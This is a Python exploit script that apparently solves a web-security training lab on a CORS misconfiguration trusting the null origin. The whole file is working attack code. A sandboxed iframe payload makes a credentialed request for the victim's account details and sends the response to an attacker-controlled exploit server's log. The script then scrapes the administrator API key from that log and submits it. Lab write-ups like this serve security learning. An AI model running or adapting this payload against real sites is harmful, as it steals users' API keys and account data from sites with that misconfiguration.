# CORS vulnerability with trusted null origin

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def deliver_payload(s, url, payload, attacker):
	post_exploit_path = attacker + '/'
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r1 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r2 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path)
	return r2

def send_cors(s, url, payload, attacker):
	if payload == "SOLUTION":
		exploit_body = """<!DOCTYPE html>
<html lang="en">
<body>
	<iframe style="display:none" sandbox="allow-scripts" srcdoc="
	<script>
		const xhr = new XMLHttpRequest();
		const url = '""" + url + """';
		xhr.onreadystatechange = () => {
			if(xhr.readyState == XMLHttpRequest.DONE) {
				fetch('/log?key=' + xhr.responseText);
			}
		};
		xhr.open('GET', url + '/accountDetails', true);
		xhr.withCredentials = true;
		xhr.send(null);
	</script>
	"></iframe>
</body>
</html>"""
	else:
		exploit_body = payload
	r = deliver_payload(s, url, exploit_body, attacker)
	time.sleep(2)
	return r

def get_api_key(s, attacker):
	log_path = attacker + '/log'
	r = s.get(log_path)
	search_string = re.search("apikey%22:%20%22(.*)%22,%20", r.text)
	if search_string:
		api_key = search_string.group(1)
		return api_key
	else:
		return False

def submit_api_key(s, url, api_key):
	print('[+] Trying to submit the API key to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": api_key}
	r = s.post(submit_path, data=submit_data)
	return r

def show_usage():
	print('[+] Usage: %s <URL> <ATTACKER> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://xxxxxxxxxx.exploit-server.net $(cat payload01.html)\n\t->\tReplace url in the src of the iframe (line 26)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com https://xxxxxxxxxx.exploit-server.net SOLUTION' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: CORS vulnerability with trusted null origin')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
		input_payload = sys.argv[3:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>').replace('=>', '=> ')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies # Comment this line to disable proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send a CORS attack to the victim...')
			r = send_cors(s, url, payload, attacker)
			time.sleep(4)
			print("[+] Trying to retrieve the API Key in exploit server's logs...")
			for i in range(1,6):
				print('[+] Try#%s' % i)
				time.sleep(2)
				api_key = get_api_key(s, attacker)
				if api_key:
					print('[+] Found Administrator API Key:\t%s' % api_key)
					break
			time.sleep(2)
			if api_key:
				r = submit_api_key(s, url, api_key)
			else:
				print("\n[-] The payload didn't send expected request <!>")

			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
